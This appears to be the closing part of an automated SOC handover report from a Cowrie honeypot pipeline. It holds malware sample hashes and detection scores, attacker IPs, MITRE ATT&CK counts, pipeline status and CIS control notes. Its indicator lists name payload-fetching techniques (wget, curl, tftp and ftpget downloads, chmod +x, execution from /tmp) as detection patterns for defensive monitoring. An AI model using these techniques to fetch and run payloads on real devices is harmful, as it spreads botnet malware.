| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `31.77.227[.]120` | US | ROCKET & MARINICA LTD | **100** ⚠️ | 23 |
| `183.239.20[.]236` | CN | China Mobile Communications Corporation | **100** ⚠️ | 38 |
| `61.143.227[.]17` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `117.69.255[.]239` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `45.79.207[.]252` | US | Linode | **100** ⚠️ | 50 |
| `45.33.109[.]18` | US | Linode | **100** ⚠️ | 50 |
| `93.152.221[.]210` | DE | TechTies Inc. | **100** ⚠️ | 11 |
| `106.12.86[.]145` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 43 |
| `217.150.37[.]249` | RU | Joint Stock Company TransTeleCom | **100** ⚠️ | 50 |
| `218.206.136[.]24` | CN | China Mobile Communications Corporation - jiangsu | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 169 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 144 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 30 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 28 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 28 |

---

## 🔕 False Positive Summary (43 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 6 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 35 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 280 cases |
| Tool 34  | Credential Extractor        | ✅ 176 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 18 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 138 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 43 filtered (15.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 85 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 144 priority case(s) shown individually · 46 recon entry/entries in table (16 group(s) consolidating 63 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-04T14:24:45Z_
